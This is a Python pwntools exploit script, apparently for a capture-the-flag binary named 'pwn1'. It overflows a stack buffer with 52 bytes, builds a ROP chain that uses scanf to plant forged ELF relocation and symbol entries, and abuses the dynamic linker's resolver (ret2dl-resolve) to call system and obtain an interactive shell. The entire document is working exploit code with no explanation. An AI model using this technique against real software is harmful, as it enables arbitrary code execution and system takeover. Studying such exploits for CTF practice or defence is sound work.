from pwn import *

def packAll(rop):
    return flat([p32(x) for x in rop])

r = process('./pwn1')
e = ELF('./pwn1')
fmt = 0x8048629
buf = 0x804a100
pp = 0x080485ee
sh = 0x804928e
STRTAB = 0x8048270
SYMTAB = 0x80481d0
JMPREL = 0x8048344

idx = (buf+0x10-SYMTAB)/0x10
r_info = (idx<<8)|0x7
reloc = [buf+0x40, r_info]
st_name = buf+0x20-STRTAB
sym = [st_name, 0, 0, 0x12]

rop = [e.plt['__isoc99_scanf'], pp, fmt, buf]
rop += [0x080483A0, buf-JMPREL, 0, sh]

data = packAll(reloc)+'\x00'*8+packAll(sym)+'system\x00'

r.sendlineafter('pwn test\n', 'A'*52+packAll(rop))
r.sendline(data)
r.interactive()

